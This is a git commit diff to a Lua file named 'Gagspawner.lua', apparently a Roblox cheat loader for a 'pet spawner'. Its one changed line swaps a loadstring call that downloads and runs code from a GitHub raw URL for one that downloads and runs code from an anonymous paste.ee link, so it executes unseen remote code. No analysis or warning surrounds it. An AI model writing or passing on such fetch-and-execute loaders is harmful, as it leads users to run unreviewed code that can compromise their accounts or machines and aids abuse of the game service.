c6cedadce1622b0c169b6003bf5ab824b4b13623
iwantsom3 <85751769+iwantsom3@users.noreply.github.com>
2025-06-12 19:38:31 +0900

    Update Gagspawner.lua

--- Gagspawner.lua
+++ Gagspawner.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
+loadstring(game:HttpGet("https://paste.ee/r/9mRmEm2P"))()
